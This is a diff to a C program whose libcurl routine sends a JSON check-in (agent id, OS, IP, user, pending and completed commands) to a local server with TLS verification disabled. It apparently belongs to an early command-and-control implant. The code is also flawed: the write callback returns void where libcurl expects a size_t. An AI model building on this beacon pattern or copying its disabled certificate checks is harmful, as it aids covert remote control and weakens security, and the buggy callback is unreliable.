@@ -2,10 +2,22 @@
 #include <curl/curl.h>
 #include <string.h>
 
+struct json{
+	char *data;
+	size_t length;
+};
 
-char *first_check_in(char *urls){
+
+void function_pt(void *ptr, size_t size, size_t nmemb, void *stream){
+    printf("%s",ptr);
+    //return ptr;
+}
+
+
+void first_check_in(char *urls){
 	CURL *curl;
 	CURLcode res;
+	//struct json *s;
 	const char *data = "{\"agent_id\":\"123\",\"os\":\"Linux\",\"ip\":\"0.0.0.0\",\"user\":\"notroot\",\"completed_commands\":[],\"pending_commands\":[]}";
 	curl_global_init(CURL_GLOBAL_DEFAULT);
 	curl = curl_easy_init();
@@ -22,21 +34,23 @@ char *first_check_in(char *urls){
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(curl,CURLOPT_URL,urls);
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
+		//curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK)
 			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
 		curl_easy_cleanup(curl);
 	}
 	curl_global_cleanup();
-	return res;
 }
 
 
 
 
 int main(void){
-	char *test_url = "https://localhost:9000/first_check_in"
-	first
+	char *test_url = "https://localhost:9000/first_check_in";
+	char *first_response;
+	first_check_in(test_url);
 	return 0;
 
 }
